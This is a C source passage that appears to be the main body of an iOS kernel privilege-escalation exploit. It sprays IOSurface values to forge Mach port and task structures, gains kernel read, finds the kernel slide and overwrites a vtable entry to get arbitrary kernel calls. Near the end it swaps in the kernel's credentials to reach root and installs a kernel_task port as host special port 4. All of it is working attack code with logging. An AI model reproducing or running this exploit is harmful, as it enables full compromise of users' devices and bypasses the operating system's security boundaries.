    ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict_create, sizeof(dict_create), &surface2, &size);
    LOG("newSurface: %s", mach_error_string(ret));
    assure(!ret);

    uint32_t dict2[DATA_PAGE_SIZE / sizeof(uint32_t) + 7] = {
        // Some header or something
        surface2.data.id,
        0x0,
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeArray | 2,
        kOSSerializeString | (DATA_PAGE_SIZE - 1),
    };
    dict2[DATA_PAGE_SIZE / sizeof(uint32_t) + 5] = kOSSerializeEndCollection | kOSSerializeString | 4;

    kport_t kport = {
        .ip_bits = 0x80000002, // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
        .ip_references = 100,
        .ip_lock = {
            .type = 0x11,
        },
        .ip_messages = {
            .port = {
                .receiver_name = 1,
                .msgcount = MACH_PORT_QLIMIT_KERNEL,
                .qlimit = MACH_PORT_QLIMIT_KERNEL,
            },
        },
        .ip_srights = 99,
        .ip_kobject = 0x6162636465666768
    };

    kport.ip_kobject = port_address - sizeof(kport);
    kport.ip_kobject += offsetof(kport_t, ip_context) - OFFSET_TASK_BSD_INFO;

    LOG("kport.ip_kobject=%p", (void*)kport.ip_kobject);

    {
        uintptr_t ptr = (uintptr_t)&dict2[5];
        *(volatile kport_t*)ptr = kport;
    }

#define SPRAY2_SIZE 0x400
    for (uint32_t i = 0; i < SPRAY2_SIZE; ++i) {
        dict2[DATA_PAGE_SIZE / sizeof(uint32_t) + 6] = transpose(i);

        uint32_t dummy;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict2, sizeof(dict2), &dummy, &size);
        doassure(!ret, {
            LOG("setValue(%u): %s", i, mach_error_string(ret));
        });
    }

    {
        uintptr_t ptr = (uintptr_t)&dict[5];
        ptr += fake_voucher_jdx * sizeof(voucher_t);
        *(volatile voucher_t*)ptr = targetVoucher;
    }

    dict[DATA_PAGE_SIZE / sizeof(uint32_t) + 6] = transpose(fake_voucher_idx);

    LOG("targetVoucher->iv_port=%p", (void*)targetVoucher.iv_port);

    ret = reallocate_buf(client, surface.data.id, fake_voucher_idx, dict, sizeof(dict));
    LOG("reallocate_buf: %s", mach_error_string(ret));
    assure(!ret);

    LOG("replacing real_port_to_fake_voucher...");
    usleep(500);
    mach_port_t old_real_port_to_fake_voucher = real_port_to_fake_voucher;
    //get shifted port
    assure(!(ret = thread_get_mach_voucher(mach_thread_self(), 0, &real_port_to_fake_voucher)));

    LOG("old real_port_to_fake_voucher=%d", old_real_port_to_fake_voucher);
    LOG("new real_port_to_fake_voucher=%d", real_port_to_fake_voucher);

    doassure(old_real_port_to_fake_voucher != real_port_to_fake_voucher, {
        LOG("Failed to receive fake port");
    });

    mach_port_t notify = MACH_PORT_NULL;
    //gimme send right for setting context
    for (int i = 0; i < NUM_AFTER2; i++) {
        assure(!(ret = _kernelrpc_mach_port_insert_right_trap(self, after2[i], after2[i], MACH_MSG_TYPE_MAKE_SEND)));
        assure(!(ret = mach_port_request_notification(self, after2[i], MACH_NOTIFY_PORT_DESTROYED, 0, realport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify)));
    }

    for (int i = 0; i < NUM_BEFORE; i++) {
        assure(!(ret = _kernelrpc_mach_port_insert_right_trap(self, before[i], before[i], MACH_MSG_TYPE_MAKE_SEND)));
        assure(!(ret = mach_port_request_notification(self, before[i], MACH_NOTIFY_PORT_DESTROYED, 0, realport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify)));
    }

    for (int i = 0; i < NUM_AFTER; i++) {
        assure(!(ret = _kernelrpc_mach_port_insert_right_trap(self, after[i], after[i], MACH_MSG_TYPE_MAKE_SEND)));
        assure(!(ret = mach_port_request_notification(self, after[i], MACH_NOTIFY_PORT_DESTROYED, 0, realport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify)));
    }

    //set refcount of faketask to something != 0
    int cnt = 1;
    for (size_t i = 0; i < NUM_AFTER2; ++i) {
        assure(!(ret = mach_port_set_attributes(self, after2[i], MACH_PORT_DNREQUESTS_SIZE, &cnt, MACH_PORT_DNREQUESTS_SIZE_COUNT)));
    }
    for (size_t i = 0; i < NUM_BEFORE; ++i) {
        assure(!(ret = mach_port_set_attributes(self, before[i], MACH_PORT_DNREQUESTS_SIZE, &cnt, MACH_PORT_DNREQUESTS_SIZE_COUNT)));
    }
    for (size_t i = 0; i < NUM_AFTER; ++i) {
        assure(!(ret = mach_port_set_attributes(self, after[i], MACH_PORT_DNREQUESTS_SIZE, &cnt, MACH_PORT_DNREQUESTS_SIZE_COUNT)));
    }

    /***
     ready is my read :D
     --slow but "safe"
     ***/

    kptr_t recv_port_address = port_address - sizeof(kport);
    LOG("useport_addr=%p", (void*)recv_port_address);

    LOG("doing first kread...");
    usleep(500);

    kptr_t realport_addr = kread64_slow(recv_port_address + offsetof(kport_t, ip_pdrequest));
    LOG("realport_addr=%p", (void*)realport_addr);

    //survived first kread, let's find the buffer in question

    //make this guy special
    assure(!(ret = _kernelrpc_mach_port_insert_right_trap(self, real_port_to_fake_voucher, real_port_to_fake_voucher, MACH_MSG_TYPE_COPY_SEND)));
    uint32_t request2[] = {
        // Same header
        surface2.data.id,
        0x0,
        0, // Key
        0x0, // Null terminator
    };

    size = sizeof(response);
    for (int i = 0; i < SPRAY2_SIZE && gfakeport_idx < 0; i++) {
        request2[2] = transpose(i);
        assure(!(ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request2, sizeof(request2), response, &size)));

        kport_t* p = (kport_t*)(&response[4]);

        if (p->ip_srights != kport.ip_srights) {
            gfakeport_idx = i;
            LOG("p->ip_srights=%d", p->ip_srights);
            LOG("fake_voucher_idx=%d", gfakeport_idx);
        }
    }
    assure(gfakeport_idx >= 0);

    kptr_t itk_space = kread64_slow(realport_addr + offsetof(kport_t, ip_receiver));
    LOG("itk_space=%p", (void*)itk_space);

    kptr_t self_task = kread64_slow(itk_space + OFFSET_IPC_SPACE_IS_TASK);
    LOG("self_task=%p", (void*)self_task);

    assure(!(ret = mach_ports_register(self, &client, 1)));

    kptr_t IOSurfaceRootUserClient_port = kread64_slow(self_task + OFFSET_TASK_ITK_REGISTERED);
    LOG("IOSurfaceRootUserClient_port=%p", (void*)IOSurfaceRootUserClient_port);

    kptr_t IOSurfaceRootUserClient_addr = kread64_slow(IOSurfaceRootUserClient_port + offsetof(kport_t, ip_kobject));
    LOG("IOSurfaceRootUserClient_addr=%p", (void*)IOSurfaceRootUserClient_addr);

    kptr_t IOSurfaceRootUserClient_vtab = kread64_slow(IOSurfaceRootUserClient_addr);
    LOG("IOSurfaceRootUserClient_vtab=%p", (void*)IOSurfaceRootUserClient_vtab);

    kbase = kread64_slow(IOSurfaceRootUserClient_vtab + OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX * sizeof(kptr_t));

    kbase = (kbase & ~(KERNEL_SLIDE_STEP - 1)) + KERNEL_HEADER_OFFSET;

    for (; kread32_slow(kbase) != KERNEL_MAGIC; kbase -= KERNEL_SLIDE_STEP)
        ;

    uint64_t slide = kbase - OFFSET_KERNELBASE;
    LOG("Kernel base: %p", (void*)kbase);
    LOG("Kernel magic: 0x%08x", kread32_slow(kbase));
    LOG("Kernel slide: %p", (void*)slide);

#define OFF(name) (v1ntex_offs->offset_##name + slide)

    kptr_t zone_map_addr = kread64_slow(OFF(zone_map));
    LOG("zone_map_addr=%p", (void*)zone_map_addr);

    ktask_t ktask = {};
    ktask.a.lock.data = 0x0;
    ktask.a.lock.type = 0x22;
    ktask.a.ref_count = 100;
    ktask.a.active = 1;
    ktask.a.map = zone_map_addr;
    ktask.b.itk_self = 1;

    kport.ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
    kport.ip_kobject = targetVoucher.iv_port + 0x100;
    kport.ip_requests = 0;
    kport.ip_context = 0;
    LOG("kport.ip_kobject=%p", (void*)kport.ip_kobject);

    {
        uintptr_t ptr = (uintptr_t)&dict2[5];
        *(volatile kport_t*)ptr = kport;

        ptr += 0x100;
        *(volatile ktask_t*)ptr = ktask;
    }

    //dunno why but realloc_buf doesn't seem to properly reallocate the page
    LOG("final buf realloc :o");
    for (int i = 0; i < SPRAY2_SIZE; i++) {
        if (i == gfakeport_idx)
            continue;
        delete_val(client, surface2.data.id, i);
    }
    usleep(500);
    sched_yield();
    delete_val(client, surface2.data.id, gfakeport_idx);
    for (uint32_t i = 0; i < SPRAY2_SIZE + 0x100; ++i) {
        dict2[DATA_PAGE_SIZE / sizeof(uint32_t) + 6] = transpose(i);

        uint32_t dummy;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict2, sizeof(dict2), &dummy, &size);
        doassure(!ret, {
            LOG("setValue(%u): %s", i, mach_error_string(ret));
        });
    }

    usleep(200);

    LOG("remapping fakeport");
    vm_prot_t cur = 0,
              max = 0;
    mach_vm_address_t shmem_addr = 0;
    kptr_t base_shared = targetVoucher.iv_port;
    sched_yield();
    ret = mach_vm_remap(self, &shmem_addr, pagesize, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, real_port_to_fake_voucher, base_shared, false, &cur, &max, VM_INHERIT_NONE);
    doassure(!ret, {
        LOG("mach_vm_remap: %s", mach_error_string(ret));
    });

    *(uint8_t*)(shmem_addr + pagesize - 1) = 123; // fault page

    LOG("shmem_addr: 0x%016llx", shmem_addr);
    kport_t* shared_kport = (kport_t*)shmem_addr; //size is something like 0xa8
    ktask_t* shared_zm_task_buf = (ktask_t*)(shmem_addr + 0x100);
    ktask_t* shared_km_task_buf = (ktask_t*)(shmem_addr + 0x400);

    kobj_t* shared_kobj = (kobj_t*)(shmem_addr + 0x700);

    uint64_t* shared_vtab = (uint64_t*)(shmem_addr + pagesize - 200 * 8); //risky guy

    LOG("dumping vtab...");
    //get a fast read real quick
    shared_kport->ip_kobject = base_shared + 0x100;
    for (int i = 0; i < 200; i++) {
        int r = 0;
        uint64_t fullr = 0;
        *(kptr_t*)(shmem_addr + 0x100 + OFFSET_TASK_BSD_INFO) = (-BSDINFO_PID_OFFSET) + IOSurfaceRootUserClient_vtab + i * 8;
        ret = pid_for_task(real_port_to_fake_voucher, &r);
        fullr |= r;
        *(kptr_t*)(shmem_addr + 0x100 + OFFSET_TASK_BSD_INFO) = (-BSDINFO_PID_OFFSET) + IOSurfaceRootUserClient_vtab + i * 8 + 4;
        ret = pid_for_task(real_port_to_fake_voucher, &r);
        fullr |= ((uint64_t)r) << 32;
        shared_vtab[i] = fullr;
    }

    //modify vtab
    shared_vtab[OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX] = OFF(rop_ldr_r0_r0_0xc);

    //setup KCALL
    memset((void*)shared_kobj, 0, sizeof(kobj_t));
    shared_kobj->a.vtab = (kptr_t)((kptr_t)shared_vtab - (kptr_t)shmem_addr + (kptr_t)base_shared);
    shared_kobj->a.refs = 100;
    shared_kobj->a.trap_ptr = (kptr_t)((kptr_t)shared_kobj - (kptr_t)shmem_addr + (kptr_t)base_shared + offsetof(kobj_t, a.obj));
    shared_kobj->a.break_stuff = 0;
    shared_kobj->b.__ipc = 100;

    shared_kport->ip_bits = 0x8000001d; // IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT
    shared_kport->ip_kobject = (kptr_t)((kptr_t)shared_kobj - (kptr_t)shmem_addr + (kptr_t)base_shared);

    // First arg to KCALL can't be == 0, so we need KCALL_ZERO which indirects through OSSerializer::serialize.
    // That way it can take way less arguments, but well, it can pass zero as first arg.
#define KCALL(addr, x0, x1, x2, x3, x4, x5, x6) \
    (                                           \
        shared_kobj->a.obj = (kptr_t)(x0),      \
        shared_kobj->a.func = (kptr_t)(addr),   \
        (kptr_t)IOConnectTrap6(real_port_to_fake_voucher, 0, (kptr_t)(x1), (kptr_t)(x2), (kptr_t)(x3), (kptr_t)(x4), (kptr_t)(x5), (kptr_t)(x6)))
#define KCALL_ZERO(addr, x0, x1, x2)                                                                                                                         \
    (                                                                                                                                                        \
        shared_kobj->a.obj = ((kptr_t)((kptr_t)shared_kobj - (kptr_t)shmem_addr + (kptr_t)base_shared + offsetof(kobj_t, a.indirect)) - 2 * sizeof(kptr_t)), \
        shared_kobj->a.func = OFF(OSSerializer_serialize),                                                                                                   \
        shared_kobj->a.indirect[0] = (x0),                                                                                                                   \
        shared_kobj->a.indirect[1] = (x1),                                                                                                                   \
        shared_kobj->a.indirect[2] = (addr),                                                                                                                 \
        (kptr_t)IOConnectTrap6(real_port_to_fake_voucher, 0, (kptr_t)(x2), 0, 0, 0, 0, 0))

    kptr_t kernel_task_addr = 0;
    int r = (int)KCALL(OFF(copyout), OFF(kernel_task), &kernel_task_addr, sizeof(kernel_task_addr), 0, 0, 0, 0);
    LOG("kernel_task=%p, %s", (void*)kernel_task_addr, mach_error_string(r));
    assure(!r);

    kptr_t kernproc_addr = 0;
    r = (int)KCALL(OFF(copyout), kernel_task_addr + OFFSET_TASK_BSD_INFO, &kernproc_addr, sizeof(kernproc_addr), 0, 0, 0, 0);
    LOG("kernproc_addr=%p, %s", (void*)kernproc_addr, mach_error_string(r));
    assure(!r);

    kptr_t kern_ucred = 0;
    r = (int)KCALL(OFF(copyout), kernproc_addr + OFFSET_PROC_UCRED, &kern_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
    LOG("kern_ucred=%p, %s", (void*)kern_ucred, mach_error_string(r));
    assure(!r);

    kptr_t self_proc = 0;
    r = (int)KCALL(OFF(copyout), self_task + OFFSET_TASK_BSD_INFO, &self_proc, sizeof(self_proc), 0, 0, 0, 0);
    LOG("self_proc=%p, %s", (void*)self_proc, mach_error_string(r));
    assure(!r);

    kptr_t self_ucred = 0;
    r = (int)KCALL(OFF(copyout), self_proc + OFFSET_PROC_UCRED, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);
    LOG("self_ucred=%p, %s", (void*)self_ucred, mach_error_string(r));
    assure(!r);

    int olduid = getuid();
    LOG("uid: %u", olduid);

    KCALL(OFF(kauth_cred_ref), kern_ucred, 0, 0, 0, 0, 0, 0);
    r = (int)KCALL(OFF(copyin), &kern_ucred, self_proc + OFFSET_PROC_UCRED, sizeof(kern_ucred), 0, 0, 0, 0);
    LOG("copyin=%s", mach_error_string(r));
    assure(!r);

    // Note: decreasing the refcount on the old cred causes a panic with "cred reference underflow", so... don't do that.
    LOG("stole the kernel's credentials");
    setuid(0); // update host port

    int newuid = getuid();
    LOG("uid: %u", newuid);

    if (newuid != olduid) {
        KCALL_ZERO(OFF(chgproccnt), newuid, 1, 0);
        KCALL_ZERO(OFF(chgproccnt), olduid, -1, 0);
    }

    host_t realhost = mach_host_self();
    LOG("realhost: %x (host: %x)", realhost, host);

    memset((void*)shared_km_task_buf, 0, sizeof(ktask));
    shared_zm_task_buf->a.lock.data = 0x0;
    shared_zm_task_buf->a.lock.type = 0x22;
    shared_zm_task_buf->a.ref_count = 100;
    shared_zm_task_buf->a.active = 1;
    shared_zm_task_buf->b.itk_self = 1;
    shared_zm_task_buf->a.map = zone_map_addr;

    memset((void*)shared_km_task_buf, 0, sizeof(ktask));
    shared_km_task_buf->a.lock.data = 0x0;
    shared_km_task_buf->a.lock.type = 0x22;
    shared_km_task_buf->a.ref_count = 100;
    shared_km_task_buf->a.active = 1;
    shared_km_task_buf->b.itk_self = 1;

    r = (int)KCALL(OFF(copyout), OFF(kernel_map), &shared_km_task_buf->a.map, sizeof(shared_km_task_buf->a.map), 0, 0, 0, 0);
    LOG("kernel_map=%p, %s", (void*)shared_km_task_buf->a.map, mach_error_string(r));
    assure(!r && shared_km_task_buf->a.map);

    kptr_t ipc_space_kernel = 0;
    r = (int)KCALL(OFF(copyout), IOSurfaceRootUserClient_port + offsetof(kport_t, ip_receiver), &ipc_space_kernel, sizeof(ipc_space_kernel), 0, 0, 0, 0);
    LOG("ipc_space_kernel=%p, %s", (void*)ipc_space_kernel, mach_error_string(r));
    assure(!r && ipc_space_kernel);

    kmap_hdr_t zm_hdr = { 0 };
    r = (int)KCALL(OFF(copyout), shared_zm_task_buf->a.map + OFFSET_VM_MAP_HDR, &zm_hdr, sizeof(zm_hdr), 0, 0, 0, 0);
    LOG("zm_range: %016llx-%016llx, %s", zm_hdr.start, zm_hdr.end, mach_error_string(r));
    assure(!r && zm_hdr.start && zm_hdr.end);

    if (zm_hdr.end - zm_hdr.start > 0x100000000) {
        LOG("zone_map is too big, sorry.");
        assure(0);
    }

    kptr_t zm_tmp = 0; // macro scratch space
#define ZM_FIX_ADDR(addr)                                                   \
    (                                                                       \
        zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr)&0xffffffff), \
        zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp)

    kptr_t zm_task_addr = (kptr_t)((kptr_t)shared_zm_task_buf - (kptr_t)shmem_addr + (kptr_t)base_shared);
    LOG("zm_task_addr=%p", (void*)zm_task_addr);

    kptr_t km_task_addr = (kptr_t)((kptr_t)shared_km_task_buf - (kptr_t)shmem_addr + (kptr_t)base_shared);
    LOG("km_task_addr=%p", (void*)km_task_addr);

    kptr_t ptrs[2] = { 0 };
    ptrs[0] = ZM_FIX_ADDR(KCALL(OFF(ipc_port_alloc_special), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    ptrs[1] = ZM_FIX_ADDR(KCALL(OFF(ipc_port_alloc_special), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    LOG("zm_port addr: %p", (void*)ptrs[0]);
    LOG("km_port addr: %p", (void*)ptrs[1]);

    KCALL(OFF(ipc_kobject_set), ptrs[0], zm_task_addr, IKOT_TASK, 0, 0, 0, 0);
    KCALL(OFF(ipc_kobject_set), ptrs[1], km_task_addr, IKOT_TASK, 0, 0, 0, 0);

    r = (int)KCALL(OFF(copyin), ptrs, self_task + OFFSET_TASK_ITK_REGISTERED, sizeof(ptrs), 0, 0, 0, 0);
    LOG("copyin=%s", mach_error_string(r));
    assure(!r);

    mach_msg_type_number_t mapsNum = 0;
    mach_port_array_t maps = NULL;
    ret = mach_ports_lookup(self, &maps, &mapsNum);
    LOG("mach_ports_lookup: %s", mach_error_string(ret));
    assure(!ret);

    LOG("zone_map port: %x", maps[0]);
    LOG("kernel_map port: %x", maps[1]);
    assure(MACH_PORT_VALID(maps[0]) && MACH_PORT_VALID(maps[1]));

    // Clean out the pointers without dropping refs
    ptrs[0] = ptrs[1] = 0;
    r = (int)KCALL(OFF(copyin), ptrs, self_task + OFFSET_TASK_ITK_REGISTERED, sizeof(ptrs), 0, 0, 0, 0);
    LOG("copyin=%s", mach_error_string(r));
    assure(!r);

    mach_vm_address_t remap_addr = 0;
    ret = mach_vm_remap(maps[1], &remap_addr, OFFSET_SIZEOF_TASK, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kernel_task_addr, false, &cur, &max, VM_INHERIT_NONE);
    LOG("mach_vm_remap: %s", mach_error_string(ret));
    assure(!ret);

    LOG("remap_addr: 0x%016llx", remap_addr);

    ret = mach_vm_wire(realhost, maps[1], remap_addr, OFFSET_SIZEOF_TASK, VM_PROT_READ | VM_PROT_WRITE);
    LOG("mach_vm_wire: %s", mach_error_string(ret));
    assure(!ret);

    kptr_t newport = ZM_FIX_ADDR(KCALL(OFF(ipc_port_alloc_special), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    LOG("newport=%p", (void*)newport);

    KCALL(OFF(ipc_kobject_set), newport, remap_addr, IKOT_TASK, 0, 0, 0, 0);

    KCALL(OFF(ipc_port_make_send), newport, 0, 0, 0, 0, 0, 0);

    r = (int)KCALL(OFF(copyin), &newport, OFF(realhost) + OFFSET_REALHOST_SPECIAL + sizeof(kptr_t) * 4, sizeof(kptr_t), 0, 0, 0, 0);
    LOG("copyin=%s", mach_error_string(r));
    assure(!r);

    ret = host_get_special_port(realhost, HOST_LOCAL_NODE, 4, &kernel_task);
    LOG("kernel_task=%x, %s", kernel_task, mach_error_string(r));
    assure(!ret && MACH_PORT_VALID(kernel_task));

    LOG("cleaning up...");
    usleep(200000); // Allow logs to propagate

    RELEASE_PORT(maps[0]);
    RELEASE_PORT(maps[1]);
    shared_kport->ip_bits = 0;
    shared_kport->ip_kobject = 0;
    RELEASE_PORT(real_port_to_fake_voucher);

    assure(!(ret = thread_set_mach_voucher(mach_thread_self(), p4)));
    RELEASE_PORT(client);
error:
    if (ret) {
        LOG("exploit failed!");
        LOG("error=%d ret=0x%08x s=%s", err, ret, mach_error_string(ret));
    } else {
        if (callback) {
            ret = callback(kernel_task, kbase, cb_data);
            if (ret != KERN_SUCCESS) {
                LOG("callback returned error: %s", mach_error_string(ret));
            }
        }
    }

    return err;
}
